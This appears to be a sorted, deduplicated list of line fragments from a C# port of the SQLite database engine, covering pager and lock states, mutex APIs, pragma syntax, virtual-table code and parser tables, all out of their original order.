   7 
   700 
   710 
   720 
   730 
   740 
   750 
   760 
   770 
   780 
   790 
   8 
   8 bytes for leaves.  12 bytes for interior nodes
   800 
   810 
   820 
   830 
   840 
   850 
   860 
   870 
   880 
   890 
   9 
   900 
   910 
   920 
   930 
   940 
   950 
   960 
   970 
   980 
   990 
   </ol>
   </ul>
   <li>  [sqlite3_mutex_alloc()] </li>
   <li>  [sqlite3_mutex_enter()] </li>
   <li>  [sqlite3_mutex_free()] </li>
   <li>  [sqlite3_mutex_held()] </li>
   <li>  [sqlite3_mutex_leave()] </li>
   <li>  [sqlite3_mutex_notheld()] </li>
   <li>  [sqlite3_mutex_try()] </li>
   <li> [sqlite3_memory_highwater()]
   <li> [sqlite3_memory_used()]
   <li> [sqlite3_soft_heap_limit()]
   <li> [sqlite3_status()]
   <ol>
   <tr><td>0<td>NULL should be returned. No new cache entry is created.
   <tr><th>createFlag<th>Expected Behaviour
   <ul>
   A unrecoverable error (an I/O error or a malloc failure) has occurred
   ABLEFTHENDEFERRABLELSEXCEPTRANSACTIONATURALTERAISEXCLUSIVE         
   AFTEREPLACEANDEFAULTAUTOINCREMENTCASTCOLUMNCOMMITCONFLICTCROSS     
   BEGIN
   BackupUpdate() or BackupRestart() to interfere with backup_remaining()
   Byte-0    Byte-1    Byte-2    Byte-3    Value
   CASCADELETECASECOLLATECREATECURRENT_DATEDETACHIMMEDIATEJOIN        
   CASE WHEN e1 THEN r1 WHEN e2 THEN r2 ... WHEN eN THEN rN ELSE y END
   CASE WHEN x=e1 THEN r1 WHEN x=e2 THEN r2 ...
   CASE x WHEN e1 THEN r1 WHEN e2 THEN r2 ... WHEN eN THEN rN ELSE y END
   COLUMNKW => ID 
   CONFLICT => ID 
   CREATE INDEX i1 ON t1(a)
   CREATE INDEX i2 ON t1(b)
   CREATE INDEX i3 ON t1(c)
   CTIME_KW => ID 
   CURRENT_TIMESTAMPRIMARYDEFERREDISTINCTDROPFAILFROMFULLGLOBYIF      
   CommitPhaseOne() again). This flag is used to ensure that the
   DATABASE => ID 
   DEFERRED => ID 
   DELETE FROM table_a WHERE col1=1 ORDER BY col2 LIMIT 1 OFFSET 1
   DELETE FROM table_a WHERE rowid IN (
   Do nothing else with this cursor.  Any attempt to use the cursor
   Hash h
   HashElem p
   INITIALLY                                                          
   INSERT INTO <table> SELECT ...
   IN_INDEX_EPH -   The cursor was opened on a specially created and
   IN_INDEX_INDEX - The cursor was opened on a database index.
   IN_INDEX_ROWID - The cursor was opened on a database table.
   ISNULLORDERESTRICTOUTERIGHTROLLBACKROWUNIONUSINGVACUUMVIEW         
   If a BtShared client fails to obtain a write-lock on a database
   In this case the database file may have been written to. So if the
   In this case there is no chance that the database was written to.
   It is cleared (set to false) whenever an exclusive lock is
   It is cleared at the end of each transaction.
   It is used when committing or otherwise ending a transaction. If
   Managing the size of the database file in pages is a little complicated.
   N == YYNSTATE
   NO_LOCK       -> SHARED_LOCK      
   OFFSET   SIZE     DESCRIPTION
   OFFSET   SIZE    DESCRIPTION
   P3 = P2 
   PAGER_EXCLUSIVE     The page cache is writing the database.
   PAGER_RESERVED      This process has reserved the database for writing
   PAGER_RESERVED state (see CommitPhaseOne() for the action). It
   PAGER_SHARED        The page cache is reading the database.
   PAGER_SYNCED        The pager moves to this state from PAGER_EXCLUSIVE
   PAGER_UNLOCK        The page cache is not currently reading or
   PRAGMA [database.]lock_proxy_file
   PRAGMA [database.]schema_version
   PRAGMA [database.]schema_version = <integer>
   PRAGMA [database.]synchronous
   PRAGMA [database.]synchronous=OFF
   PRAGMA [database.]user_version
   PRAGMA [database.]user_version = <integer>
   PRAGMA encoding
   PRAGMA table_info(<table>)
   PRAGMA temp_store
   PRAGMA temp_store_directory
   Pager.journalOff          Return value
   REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECT       
   RESERVED_LOCK -> EXCLUSIVE_LOCK   
   RESTRICT => ID 
   ROLLBACK => ID 
   SELECT 
   SELECT (SELECT col FROM tbl
   SELECT (SELECT col FROM tbl)
   SELECT a
   SELECT abc FROM (SELECT col AS abc FROM tbl)
   SELECT col FROM tbl
   SELECT count(
   SELECT max(x) FROM ...
   SELECT min(x) FROM ...
   SERTMATCHPLANALYZEPRAGMABORTVALUESVIRTUALIMITWHENWHERENAME         
   SHARED_LOCK   -> EXCLUSIVE_LOCK   
   SHARED_LOCK   -> RESERVED_LOCK    
   SQLITE_FULL does not affect the sqlite3PagerGet() and sqlite3PagerLookup()
   SQLITE_FULL return code is slightly different. It persists only until the
   SQLITE_MUTEX_NOOP         For single-threaded applications.  No
   SQLITE_MUTEX_OMIT         No mutex logic.  Not even stubs.  The
   SQLITE_MUTEX_OS2          For multi-threaded applications on OS/2.
   SQLITE_MUTEX_PTHREADS     For multi-threaded applications on Unix.
   SQLITE_MUTEX_W32          For multi-threaded applications on Win32.
   SQLITE_TEMP_STORE     db->temp_store     Location of temporary database
   So is safe to finalize the journal file even if the playback
   TODO: It might be easier to set this variable in writeJournalHdr()
   TODO: Under what conditions is dbSizeValid set
   The dbModified flag is set whenever a database page is dirtied.
   The index is over the same set of columns
   The point of this flag is that it must be set after the
   The same DESC and ASC markings occurs on all columns
   The same collating sequence on each column
   The shared-cache leaves the 'pending lock' state when either of
   The variable Pager.dbSize contains the number of pages that the database
   This boolean variable is used to make sure that the change-counter
   This feature is included to help prevent writer-starvation.
   This flag is set whenever the the main journal is synced.
   This variable is set and cleared by sqlite3PagerWrite().
   This variable is used to ensure that the master journal file name
   Transition                        
   UNIQUERYATTACHAVINGROUPDATEBEGINNERELEASEBETWEENOTNULLIKE          
   VdbeCursor does not point to a valid entry. This can happen (for example)
   VdbeCursor points to a valid entry. getPayload() etc. may be called.
   We can always do the transfer if the table contains an
   We can conditionally do the transfer if the destination
   XISTSAVEPOINTERSECTRIGGEREFERENCESCONSTRAINTOFFSETEMPORARY         
   YYNSTATE <= N < YYNSTATE
   a) The page number is less than or equal to the size of the 
   and is returned as the result of every major pager API call.  The
   ap     This is a pointer to a list of arguments.  Same as in
   arg    This is the pointer to anything which will be passed as the
   as the contents of the in-memory cache are now suspect.
   assert( assert_pager_state(pPager) )
   associated mutexes.
   b) When a savepoint is being rolled back and we need to load
   bRev) 
   backup_pagecount() are not thread-safe functions. If they are called
   balance_deeper()
   balance_nonroot()
   balance_quick()
   because the table is empty or because BtreeCursorFirst() has not been
   called.
   can only happen if an exclusive lock is held on the database file.
   case 0:
   cntNew[i]: Index in apCell[] and szCell[] for the first cell to
   committed.
   contains the number of pages in the database image when the current
   cursor.  The error has left the cache in an inconsistent state.
   define COLNAME_N      1      /
   define COLNAME_N      2      /
   define MAX_ROWID 0x7fffffff
   define SQLITE_BIG_DBL (((sqlite3_int64)1)<<60)
   define SQLITE_INT_TO_PTR(X)  ((void
   define SQLITE_OS_OS2 0
   define SQLITE_OS_UNIX 0
   define SQLITE_OS_WIN 0
   define SQLITE_PTR_TO_INT(X)  ((int)(X))
   define SQLITE_PTR_TO_INT(X)  ((int)(intptr_t)(X))
   define _FILE_OFFSET_BITS 64
   elif defined(__EMX__) 
   else
   error code encountered.
   expensive_assert( pcacheCheckSynced(pCache) )
   failing operation.
   first journal header in a journal file has been synced to disk.
   flag_alternateform          TRUE if a '
   flag_altform2               TRUE if a '!' is present.
   flag_blanksign              TRUE if a ' ' is present.
   flag_leftjustify            TRUE if a '-' is present or if the
   flag_long                   TRUE if the letter 'l' (ell) prefixed
   flag_longlong               TRUE if the letter 'll' (ell ell) prefixed
   flag_plussign               TRUE if a '
   flag_zeropad                TRUE if the width began with 0.
   for(p=sqliteHashFirst(
   func   This is a pointer to a function taking three arguments
   hot-journal rollback).
   if defined(_WIN32) 
   if some pages have been appended to the database image but not yet written
   if( NOT <in-memory journal> ){
   if( isOpen(pPager.jfd) ){ ...
   if( pPager.jfd->pMethods ){ ...
   if( register==NULL ){
   image currently contains. As the database image grows or shrinks this
   in variables BtCursor.pKey and BtCursor.nKey. When a cursor is in
   infop                       Pointer to the appropriate info struct.
   isalnum()                        0x06
   isalpha()                        0x02
   isdigit()                        0x04
   isspace()                        0x01
   isxdigit()                       0x08
   journalMode==DELETE
   journalMode==MEMORY
   journalMode==PERSIST
   journalMode==TRUNCATE
   master journal name is only written to the journal file the first
   may attempt to commit the transaction again later (calling
   may be written into the journal file while the pager is still in
   modified since the cursor was last used. The cursor position is saved
   not updated more often than necessary.
   of pages in the database file. This may be different from Pager.dbSize
   offset = 36 
   on a different connection that shares the BtShared cache with this
   only guaranteed to be correct if the boolean Pager.dbSizeValid is true.
   or backup_pagecount().
   otherwise enter the error state and return the error code from the
   out from the cache to the actual file on disk. Or if the image has been
   pMem.n = n
   pMem.z = null
   pMem.zBLOB = new byte[n]
   pWInfo.a[].iFrom     Which term of the FROM clause is being coded
   pWInfo.a[].iIdxCur   The VDBE cursor for the index
   pWInfo.a[].iTabCur   The VDBE cursor for the data_base table
   pWInfo.a[].nEq       The number of == and IN constraints
   pWInfo.a[].pIdx      The index to use for this level of the loop.
   pWInfo.a[].wsFlags   WHERE_xxx flags Debug.Associated with pIdx
   playback operation did not succeed it would not be safe to finalize
   precision                   The specified precision.  The default
   result set is empty 
   seek the cursor to the saved position.
   serial type        bytes of data      type
   set to true.
   should return the error code stored in BtCursor.skip
   some other process can use it to restore the database state (by
   sqlite3ConnectionBlocked()
   sqlite3ConnectionClosed()
   sqlite3ConnectionUnlocked()
   sqlite3_finalize(pStmt)
   sqlite3_unlock_notify()
   structure may be accessed via two groups of thread-safe entry points:
   sub-journals are only used for in-memory pager files.
   the Btree objects may have their own mutexes that require locking.
   the count using a callback. 
   the database file (see function pager_write()).
   the dbModified flag is clear then less work has to be done.
   the following occur:
   the journal file. It needs to be left in the file-system so that
   the shared-cache enters 'pending-lock' state and isPending is
   the values returned may be invalid. There is no way for a call to
   then attempts to upgrade to an exclusive lock. If this attempt
   then only (2) is performed. In this case there is no journal file
   time CommitPhaseOne() is called.
   to roll back.
   to wait for a journal sync before they can be written out to
   toupper()                        0x20
   transaction was opened. The contents of all three of these variables is
   transaction.
   truncated by an incremental-vacuum operation. The Pager.dbOrigSize variable
   undef SQLITE_OS_OS2
   undef SQLITE_OS_OTHER
   undef SQLITE_OS_UNIX
   undef SQLITE_OS_WIN
   updating the change-counter is omitted for the current transaction.
   v
   variable is updated. The variable Pager.dbFileSize contains the number
   width                       The specified field width.  This is
   xtype                       The class of the conversion.
   }
  !bRev) 
  $Header$
  'a'            TEXT
  'b'            NONE
  'c'            NUMERIC
  'd'            INTEGER
  'e'            REAL
  (1)  8 byte prefix.  A copy of aJournalMagic[].
  (10)  The subquery does not use aggregates or the outer query does not
  (11)  The subquery and the outer query do not both have ORDER BY clauses.
  (12)  Not implemented.  Subsumed into restriction (3).  Was previously
  (13)  The subquery and outer query do not both use LIMIT
  (14)  The subquery does not use OFFSET
  (15)  The outer query is not part of a compound select or the
  (16)  The outer query is not an aggregate or the subquery does
  (19)  The subquery does not use LIMIT or the outer query does not
  (2)  4 byte big-endian integer which is the number of valid page records
  (3)  4 byte big-endian integer which is the initial value for the
  (4)  4 byte integer which is the number of pages to truncate the
  (5)  4 byte big-endian integer which is the sector size.  The header
  (6)  4 byte big-endian integer which is the page case.
  (7)  4 byte integer which is the number of bytes in the master journal
  (8)  N bytes of the master journal name.  The name will be nul-terminated
  (__ppc__))
  (a) the value returned by OsDeviceCharacteristics() indicates that
  (b) that if it is a view then ON INSERT triggers exist
  (b) the value returned by OsSectorSize() is less than or equal
  (void)sqlite3SafetyOff(db)
  (void)sqlite3SafetyOn(db)
  ---------------  ----------   ----------------------------------------
  ------------------------------
  -->
  ... is correcct. 
  ... of the TK_xx values... 
  //
  // 
  //        db.mallocFailed = 1
  //      if ( db.mallocFailed != 0 ) goto no_mem
  //      if ( db.mallocFailed != 0 ) goto select_end
  // Walker Methods
  // pcache Methods
  // sqlite3ParserARG_SDECL                /
  // use PRIVILEGE_SET_ALL_NECESSARY
  /// </summary>
  /// <summary>
  /// C
  ////        db.mallocFailed = 1
  //For Recursion Storage
  //if( pMem.z!= null ){
  //sqlite3_mutex sqlite3_mutex
  0 == db.mallocFailed 
  0: not writable.  1: Transaction.  2: Checkpoint  
  0xxxxxxx                                 00000000 00000000 0xxxxxxx
  10 
  1000 
  1010 
  1020 
  1030 
  1040 
  1050 
  1060 
  1070 
  1080 
  1090 
  11 
  1100 
  110110ww wwzzzzyy   110111yy yyxxxxxx    000uuuuu zzzzyyyy yyxxxxxx
  110yyyyy  10xxxxxx                       00000000 00000yyy yyxxxxxx
  1110 
  1110zzzz  10yyyyyy  10xxxxxx             00000000 zzzzyyyy yyxxxxxx
  11110uuu  10uuzzzz  10yyyyyy  10xxxxxx   000uuuuu zzzzyyyy yyxxxxxx
  1120 
  1130 
  1140 
  1150 
  1160 
  1170 
  1180 
  1190 
  12 
  1200 
  1210 
  1220 
  1230 
  1240 
  1250 
  1260 
  1270 
  1280 
  1290 
  13 
  1300 
  1310 
  1320 
  1330 
  1340 
  1350 
  1360 
  1370 
  1380 
  1390 
  14 
  1400 
  1410 
  1420 
  1430 
  1440 
  1450 
  1460 
  1470 
  1480 
  1490 
  15 
  1500 
  1510 
  16 
  17 
  18 
  19 
  2 bytes per cell.  Sorted order.
  20 
  2008 Noah B Hart
  21 
  22 
  23 
  24 
  25 
  26 
  27 
  28 
  29 
  30 
  31 
  32 
  33 
  34 
  35 
  36 
  37 
  38 
  39 
  4 byte checksum
  4 byte page number.
  40 
  41 
  42 
  43 
  44 
  45 
  46 
  47 
  48 
  49 
  50 
  51 
  52 
  53 
  54 
  55 
  56 
  57 
  58 
  59 
  60 
  61 
  62 
  63 
  64 
  65 
  66 
  67 
  68 
  69 
  7 bits - A
  70 
  71 
  72 
  73 
  74 
  75 
  76 
  77 
  78 
  79 
  80 
  81 
  82 
  83 
  84 
  85 
  86 
  87 
  88 
  89 
  90 
  91 
  92 
  93 
  94 
  95 
  96 
  97 
  98 
  99 
  </ItemGroup>
  </PropertyGroup>
  </Target>
  <ItemGroup>
  <PropertyGroup>
  <li>sqlite3_column_blob() followed by sqlite3_column_bytes()</li>
  <li>sqlite3_column_text() followed by sqlite3_column_bytes()</li>
  <li>sqlite3_column_text16() followed by sqlite3_column_bytes16()</li>
  A few extensions to the formatting notation are supported:
  A v- version (ex: vsnprintf) of every function is also
  ALWAYS(db->mallocFailed==0) 
  All functions are fully reentrant.
  An in-memory database can only have its journal_mode set to _OFF
  Any expression that evaluates to two or more opcodes.
  Arbitrary order interspersed with freeblocks.
  Bytes in the range of 0x80 through 0xbf which occur as the first
  CHECK            REPLACE      Illegal.  The results in an exception.
  Calls to this routine from Y must block until the outer-most
  Character      Column affinity
  Constraint type  Action       What Happens
  Debug.Assert( (ppPage).pPager==pPager 
  Debug.Assert( (ppPage).pgno==pgno )
  EXCLUSIVE => ID 
  Ephemeral Table objects are created for all FROM-clause subqueries.
  Expr 
  FuncDef 
  Grows downward
  Grows upwards
  How aggressive at syncing data to disk  
  IMMEDIATE => ID 
  INITIALLY => ID 
  INSERT INTO table1 VALUES('It''s a happy day!')
  INSERT INTO table1 VALUES('It's a happy day!')
  Identifiers in expression are matched to tables.
  Included in SQLite3 port to C
  Last Changed By : $LastChangedBy: noah.hart $
  Module 
  NO  2.  Make sure cell keys are in order.
  NO  3.  Make sure no key is less than or equal to zLowerBound.
  NO  4.  Make sure no key is greater than or equal to zUpperBound.
  NOT NULL         REPLACE      The NULL value is replace by the default
  Name of this database  
  ON and USING clauses are shifted into WHERE statements
  OP_Destroy
  OP_Halt with P1=SQLITE_CONSTRAINT and P2=OE_Abort.
  OP_VRename
  OP_VUpdate
  Original text of the expression 
  PRAGMA [database.]auto_vacuum
  PRAGMA [database.]auto_vacuum=N
  PRAGMA [database.]cache_size
  PRAGMA [database.]cache_size=N
  PRAGMA [database.]default_cache_size
  PRAGMA [database.]default_cache_size=N
  PRAGMA [database.]incremental_vacuum(N)
  PRAGMA [database.]journal_mode
  PRAGMA [database.]journal_mode = (delete
  PRAGMA [database.]journal_size_limit
  PRAGMA [database.]journal_size_limit=N
  PRAGMA [database.]locking_mode
  PRAGMA [database.]locking_mode = (normal
  PRAGMA [database.]max_page_count
  PRAGMA [database.]max_page_count=N
  PRAGMA [database.]page_count
  PRAGMA [database.]page_size
  PRAGMA [database.]page_size=N
  Parse 
  Ptr(0) 
  Recursive calls to this routine from thread X return immediately
  Repository path : $HeadURL: https://sqlitecs.googlecode.com/svn/trunk/C%23SQLite/src/Delagates.cs $
  Repository path : $HeadURL: https://sqlitecs.googlecode.com/svn/trunk/C%23SQLite/src/opcodes_c.cs $
  Repository path : $HeadURL: https://sqlitecs.googlecode.com/svn/trunk/C%23SQLite/src/parse_h.cs $
  Revision        : $Revision$
  SAVEPOINT => ID 
  SEMI  WS  OTHER 
  SEMI  WS  OTHER EXPLAIN  CREATE  TEMP  TRIGGER  END  
  SQLITE_ENABLE_EXPENSIVE_ASSERT
  TODO --  How to implement this
  Table 
  The %b field outputs an integer in binary notation.
  The %c field now accepts a precision.  The character output
  The B Tree structure for this database file  
  The estimated number of rows that will be retrieved.  (The
  The index must be on the list of
  The journal mode may not be changed while a transaction is active.
  The right-hand side is a correlated subquery
  The right-hand side is an expression list containing variables
  The semantic value stored at this level of the stack.  This is
  The state number for the parser at this level of the stack.
  The value of the token stored at this level of the stack.
  This routine accepts an infinite number of different UTF8 encodings
  This routine never allows a 7-bit character (0x00 through 0x7f) to
  This routine never allows a UTF16 surrogate value to be encoded.
  Token 
  UNIQUE           REPLACE      The other row that conflicts with the row
  VDBE VdbeCursor numbers are assigned to all FROM-clause terms.
  VTable 
  VTable pVTab = IsVirtual(pTab) 
  We are inside a trigger
  Whether or not sorting must occur.
  Whether or not there must be separate lookups in the
  addArgumentToVtab(pParse)
  and free space fragments.
  any              ABORT        Back out changes from the current command
  any              FAIL         Sqlite_exec() returns immediately with a
  any              IGNORE       The record number and data is popped from
  any              ROLLBACK     The current transaction is rolled back and
  assert( !db 
  assert( !db->pVTab )
  assert( (pTab->tabFlags 
  assert( (rc
  assert( 0==pTable->pIndex )
  assert( IsVirtual(pTab) )
  assert( db )
  assert( db==0 
  assert( iDb>=0 )
  assert( pTab 
  assert( pTab )
  assert( pVTab->nRef>0 )
  assert( pVtab!=0 )
  assert( pVtab->pModule!=0 )
  assert( sqlite3BtreeHoldsAllMutexes(db) )
  assert( sqlite3SafetyCheckOk(db) )
  assert( sqlite3_mutex_held(db->mutex) )
  assert( xConstruct )
  bRev) 
  char 
  const char 
  const int ARRAY_INCR = 5
  const sqlite3_module 
  db = pParse->db
  db->aVTrans = 0
  db->aVTrans = aVTrans
  db->aVTrans[db->nVTrans
  db->pDisconnect = 0
  db->pVTab = 0
  db->pVTab = pTab
  define INT16_TYPE int16_t
  define INT16_TYPE short int
  define INT8_TYPE int8_t
  define INT8_TYPE signed char
  define IsHiddenColumn(X) ((X)->isHidden)
  define IsHiddenColumn(X) 0
  define IsVirtual(X)      (((X)->tabFlags 
  define IsVirtual(X)      0
  define SQLITE_OS_OS2 0
  define SQLITE_OS_UNIX 0
  define SQLITE_OS_WIN 0
  define sqlite3VtabArgInit(P)
  define sqlite3VtabClear(Y)
  define sqlite3VtabCommit(X)
  define sqlite3VtabInSync(db) ((db)->nVTrans>0 
  define sqlite3VtabInSync(db) 0
  define sqlite3VtabLock(X) 
  define sqlite3VtabRollback(X)
  define sqlite3VtabUnlock(X)
  define sqlite3VtabUnlockList(X)
  define u3216_TYPE u3216_t
  define u3216_TYPE unsigned short int
  define u328_TYPE u328_t
  define u328_TYPE unsigned char
  define u32_TYPE u32_t
  define u32_TYPE unsigned int
  elif SQLITE_OS_OS2
  elif SQLITE_OS_WIN
  else
  else {
  endif
  for(i=0
  for(pVtab=pTab->pVTable
  if ( ( ppPage ).pPager != null )
  if (__APPLE__)
  if SQLITE_OS_UNIX
  if( !db->init.busy ){
  if( !pMod ){
  if( !pTab ){
  if( !pVTab ){
  if( !pVTable ){
  if( !zModuleName ){
  if( (db->nVTrans%ARRAY_INCR)==0 ){
  if( (pTab->tabFlags 
  if( ALWAYS(pTab!=0 
  if( IsVirtual(pTab) ){
  if( NEVER(pExpr==0) ) return pDef
  if( NEVER(pTab==0) ) return pDef
  if( SQLITE_OK!=rc ){
  if( apVtabLock ){
  if( azModuleArg==0 ){
  if( db->aVTrans ){
  if( db.aDb[0].pBt==0 ) return
  if( p ){
  if( p->azModuleArg ){
  if( pArg->z==0 ){
  if( pExpr->op!=TK_COLUMN ) return pDef
  if( pMod ){
  if( pMod->xFindFunction==0 ) return pDef
  if( pModule->xBegin ){
  if( pNew==0 ){
  if( pPager.errCode!=SQLITE_OK 
  if( pParse->sArg.z 
  if( pParse==0 ){
  if( pTab->nModuleArg<1 ) return
  if( pTab==0 ) return
  if( pTable->azModuleArg ){
  if( pTable==0 ) return
  if( pVTab->nRef==0 ){
  if( rc!=SQLITE_OK ){
  if( rc==0 ){
  if( rc==SQLITE_NOMEM ) db->mallocFailed = 1
  if( rc==SQLITE_OK 
  if( rc==SQLITE_OK ){
  if( sqlite3VtabInSync(db) ){
  if( zLowerName ){
  include <os2safe.h> /
  int (
  int i
  int i = pTable->nModuleArg
  int iDb
  int nArg = pTab->nModuleArg
  int nBytes = sizeof(char 
  int rc
  int rc = 0
  int rc = SQLITE_OK
  int rcsafety
  internal static class HelperMethods
  it might be an overflow page
  mprintf --  Similar to sprintf.  Writes output to memory
  n = (pParse->nVtabLock
  nName = sqlite3Strlen30(zName)
  p->pVTable = 0
  pMod = (Module
  pMod = (Module 
  pMod = (sqlite3_module 
  pModule = pVTab->pVtab->pModule
  pNew->flags 
  pNew->pUserData = pArg
  pNew->xFunc = xFunc
  pNew->zName = (char 
  pPager.pageSize bytes of data.
  pParse->sArg.n = 0
  pParse->sArg.z = 0
  pParse->sNameToken.n = (int)(
  pTab = db->pVTab
  pTab = pExpr->pTab
  pTable = pParse->pNewTable
  pTable->azModuleArg = azModuleArg
  pTable->nModuleArg = 0
  pTable->tabFlags 
  pTerm = pWC.a[idxTerm]
  pVTab->nRef
  pVTab->nRef--
  pVTable->db = db
  pVTable->pMod = pMod
  public class SQLiteVdbe
  public delegate   int dxMutexHeld(sqlite3_mutex sm)
  public delegate   int dxMutexNotheld(sqlite3_mutex sm)
  public delegate   int dxMutexTry(sqlite3_mutex sm)
  public delegate   sqlite3_mutex dxMutexAlloc(int iNumber)
  public delegate   void dxMutexEnter(sqlite3_mutex sm)
  public delegate   void dxMutexLeave(sqlite3_mutex sm)
  public delegate  void dxMutexFree(sqlite3_mutex sm)
  public delegate int dxMutexEnd( )
  public delegate int dxMutexInit()
  public partial class CSSQLite
  rc = sqlite3SafetyOff(db)
  rcsafety = sqlite3SafetyOn(db)
  return SQLITE_OK
  return pNew
  return pRet
  return pVtab
  return rc
  sqlite3 
  sqlite3GlobalConfig.mutex.xMutexHeld( p ) != 0 ) 
  sqlite3GlobalConfig.mutex.xMutexNotheld( p ) != 0 ) 
  sqlite3GlobalConfig.pPage to a block of memory that records
  sqlite3VtabLock(pVTab)
  sqlite3_free(zSQL)
  sqlite3_module 
  sqlite3_mutex_enter(db->mutex)
  sqlite3_mutex_leave(db->mutex)
  sqlite3_vtab 
  startEq 
  unsigned char 
  using DbPage = CSSQLite.PgHdr
  using LONGDOUBLE_TYPE = System.Double
  using MemJournal = CSSQLite.sqlite3_file
  using Op = CSSQLite.VdbeOp
  using System
  using System.Globalization
  using System.Text
  using Vdbe = CSSQLite.Vdbe
  using etByte = System.Boolean
  using i64 = System.Int64
  using sqlite = CSSQLite.sqlite3
  using sqlite3ParserTOKENTYPE = CSSQLite.Token
  using sqlite3_callback = CSSQLite.dxCallback
  using sqlite3_int64 = System.Int64
  using sqlite3_pcache = CSSQLite.PCache1
  using sqlite3_stmt = CSSQLite.Vdbe
  using sqlite3_u3264 = System.UInt64
  using sqlite3_value = CSSQLite.Mem
  using sqlite_int64 = System.Int64
  using sqlite_u3264 = System.UInt64
  using u64 = System.UInt64
  using u8 = System.Byte
  using va_list = System.Object
  void 
  void (
  while( pVTable ){
  xprintf --  Calls a function to dispose of output.
  yy_action[]        A single table containing all actions.
  yy_default[]       Default action for each state.
  yy_lookahead[]     A table containing the lookahead for each entry in
  zMod = pTab->azModuleArg[0]
  zNum[i]
  zzzzyyyy yyxxxxxx                        00000000 zzzzyyyy yyxxxxxx
  } 
  }else if( ALWAYS(pVTable->pVtab) ){
  }else if( xDestroy ){
  }else{
 !( ( pE.flags 
 !(HAVE_LOCALTIME_S) 
 !(SQLITE_DEBUG)
 !(SQLITE_OMIT_AUTOVACUUM)
 !(SQLITE_OMIT_DISKIO)
 !(SQLITE_OMIT_PAGER_PRAGMAS) 
 !(SQLITE_OMIT_SUBQUERY)
 !(SQLITE_OMIT_TRIGGER)
 !(SQLITE_OMIT_VACUUM)
 !(SQLITE_OMIT_VACUUM) 
 !(SQLITE_OMIT_VIEW)
 !(SQLITE_OMIT_VIRTUALTABLE)
 !DbHasProperty(
 !IN_DECLARE_VTAB )
 !IsVirtual( pTab ) )
 !NDEBUG
 !NDEBUG 
 !NO_TCL
 !SQLITE_DEBUG
 !SQLITE_MAX_COLUMN
 !SQLITE_OMIT_ANALYZE) 
 !SQLITE_OMIT_ATTACH
 !SQLITE_OMIT_BLOB_LITERAL 
 !SQLITE_OMIT_BUILTIN_TEST
 !SQLITE_OMIT_CHECK) 
 !SQLITE_OMIT_DATETIME_FUNCS) 
 !SQLITE_OMIT_FLOATING_POINT
 !SQLITE_OMIT_FOREIGN_KEY) 
 !SQLITE_OMIT_OR_OPTIMIZATION 
 !SQLITE_OMIT_SHARED_CACHE 
 !SQLITE_OMIT_SUBQUERY
 !SQLITE_OMIT_SUBQUERY 
 !SQLITE_OMIT_SUBQUERY) 
 !SQLITE_OMIT_TRACE  
 !SQLITE_OMIT_TRIGGER
 !SQLITE_OMIT_TRIGGER 
 !SQLITE_OMIT_TRIGGER  
 !SQLITE_OMIT_TRIGGER) 
 !SQLITE_OMIT_VIEW
 !SQLITE_OMIT_VIEW) 
 !SQLITE_OMIT_VIRTUALTABLE
 !SQLITE_OMIT_VIRTUALTABLE)
 !SQLITE_OMIT_VIRTUALTABLE) 
 !SQLITE_OS_OTHER)
 !SQLITE_OS_WIN
 !String.IsNullOrEmpty( p.u.zToken ) )
 !String.IsNullOrEmpty( pItem.zName ) ) sqlite3Dequote( ref pItem.zName )
 !String.IsNullOrEmpty( pPager.zJournal ) )
 !_HWTIME_H_) 
 !_OS_COMMON_H_) 
 !_VDBEINT_H_) 
 !__APPLE__ 
 !__CYGWIN__
 !__DARWIN__ 
 !bRev) 
 !db.mallocFailed )
 !defined(SQLITE_DEBUG) 
 !defined(SQLITE_MUTEX_NOOP)
 !defined(SQLITE_OMIT_SUBQUERY) 
 !defined(SQLITE_OMIT_SUBQUERY) /
 !doesStatementRollback )
 !flag_leftjustify 
 !fullNames )
 !hasDistinct )
 !isMemdb)
 !isOpen( pPager.jfd ) )
 !isOpen( pPager.sjfd ) )
 !isQuick
 !isQuick 
 !isSpecialError ) )
 !isView )
 !noSync )
 !p.locked)
 !pBt.autoVacuum))
 !pBt.readOnly)
 !pCur.aOverflow ){
 !pPager.dbModified
 !pPager.dbModified )
 !pPager.noSync )
 !pPager.pInJournal )
 !pPager.tempFile )
 !pTab ){
 !pTab->pVTable )
 !pnoCase ) )
 !prevEscape )
 !readOnly )
 !seen )
 !sqlite3BtreeIsInReadTrans( p.pSrc ) )
 !sqlite3GlobalConfig.bFullMutex )
 !sqlite3IsMemJournal(x)) {     
 !sqlite3Isalpha(zIn[i])
 !sqlite3Isdigit( z[zIndex] ) )
 !sqlite3Isdigit( z[zIndex] ) ) return 0
 !sqlite3Isspace( c ) 
 !sqlite3SafetyCheckSickOrOk( db ) )
 !sqlite3_mutex_held(p->pBt->mutex)) ){
 !startEq 
 !subjRequiresPage( pPg ) )
 %-conversion extensions.
 %Q 
 %q is designed for use inside a string literal.  By doubling each '
 %w -> Strings with '
 %w . Strings with '
 ' SELECT 
 '0'
 '0' )
 'BLOB'        
 'CHAR'        
 'CLOB'        
 'DOUB'        
 'FLOA'        
 'INT'         
 'REAL'        
 'T' == zDate[zIndex] ) ) { zIndex
 'TEXT'        
 '[' is a single-byte character 
 'serial-type' and a blob of data. The serial type is an 8-byte unsigned
 't' for SQLITE_AFF_TEXT.  But we can save a little space and improve
 ( !isMemDb 
 ( !isOpen( pPager.jfd ) 
 ( !max 
 ( !p.affChange 
 ( !pPager.exclusiveMode 
 ( ( !pCache.bPurgeable 
 ( ( ( c = (byte)z[iOffset 
 ( ( ( flags 
 ( ( (i64)0x7fffffff ) << 32 ) )
 ( ( (sqlite3_int64)1 ) << 63 ) )
 ( ( (u32)1 ) << i ) ) == 0 
 ( ( (u64)0xff000000 ) << 32 ) ) != 0 )
 ( ( _z < z.Length ) 
 ( ( c = pToken.z[0] ) == '
 ( ( error = GetLastError() ) != NO_ERROR ) )
 ( ( iPageSize - 1 ) 
 ( ( iSectorSize - 1 ) 
 ( ( locktype == EXCLUSIVE_LOCK )
 ( ( op == SAVEPOINT_ROLLBACK ) 
 ( ( p.db.flags 
 ( ( pLevel.plan.wsFlags 
 ( ( pMem.flags 
 ( ( pRight.flags 
 ( ( pTab.tabFlags 
 ( ( pTerm.prereqAll 
 ( ( z[iOffset 
 ( (Vdbe)pStmt ).db : null
 ( (double)timeF / (double)ntuPerDay )
 ( (u32)1 << i ) ) != 0 ) 
 ( -1 - p2 )
 ( 0 == isSavepnt 
 ( 0x3f 
 ( 0x7f )
 ( 0x7f << 14 ) 
 ( 1 
 ( 1 << ( I 
